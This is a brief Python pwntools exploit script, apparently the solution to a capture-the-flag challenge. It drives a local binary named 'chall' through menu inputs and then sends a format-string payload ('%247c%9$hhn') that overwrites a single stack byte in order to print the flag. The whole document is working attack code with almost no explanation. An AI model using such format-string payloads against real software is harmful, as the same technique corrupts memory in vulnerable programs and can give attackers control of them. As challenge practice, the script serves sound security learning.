from pwn import *

p = process("./chall")


# Main Payload
fmt = b"%247c%9$hhn"

#Filling the rest of the buffer
fmt += b"A" * (19 - len(fmt))

#Grabing the proper address from the stack
print(p.recv())
p.sendline(b"11")

#Selecting the least significant byte to modify
print(p.recv())
p.sendline(b"0")

#XORing that byte by the proper value
print(p.recv())
p.sendline(b"69")

#Sending the payload
print(p.recv())
p.sendline(fmt)

#Print the flag
print(p.recv())
